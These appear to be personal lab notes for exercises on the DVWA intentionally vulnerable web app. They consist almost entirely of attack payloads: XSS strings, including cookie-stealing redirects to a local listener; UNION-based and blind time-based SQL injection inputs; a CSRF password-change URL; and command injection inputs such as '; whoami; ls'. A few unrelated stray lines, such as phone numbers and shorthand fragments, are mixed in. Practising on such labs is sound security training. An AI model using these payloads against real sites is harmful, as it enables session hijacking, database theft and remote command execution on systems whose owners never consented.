XSS

<script>alert("hacked")</script>

><script>alert("hacked")</script>

</option></select><script>alert("hacked")</script>

<scR<script>iPt>alert("hacked")</scRiPt>

<scRiPt>alert("hacked")</scRiPt>

<scRiPt>alert(document.cookie)</scRiPt>



<ScRiPt>window.location="http://127.0.0.1:1212/?cookie="+document.cookie</sCriPt>

<img src/onerror=window.location="http://127.0.0.1:1234/?cookie="+document.cookie>

XSS DOM-Medium:
</select><img src/onerror=alert(document.cookie)>

<?php
phpinfo();
?>

SQLi

ID: 1'or'1'='1'UNION SELECT "text1","text2";-- -&Submit=Submit

1'or'1'='1' UNION SELECT 1,2;-- -&Submit=Submit

1'or'1'='1'
1 or 1=1' UNION SELECT 1,2;-- -&Submit=Submit

## CSL training
01613 275276
01613 275280

<<Blind SQL>>

1' and sleep(5)#
1 and sleep(5)
<<Finding length of database>>
1' and length(database())=1#

<<finding out database name>>
1' and ascii(substr(database(),1,1))>109#	**in ascii, m=109
1' and ascii(substr(database(),1,1))>99#	**in ascii, c=99


## CSRF

*Low:
http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change&user_token=8905297a7fabacb634073f0692638b15

## Command Injection

*Low:
IP; ls
IP; cat file.txt
IP; whoami; hostname; ifconfig; pwd; ls ../; echo "hacked"

IP %% ls
IP || ls

*Medium: (Background with "&")
127.0.0.1 & ls

*High
127.0.0.1|ls

mar
	derivatives

pr 	blocking susp acc
lic asia
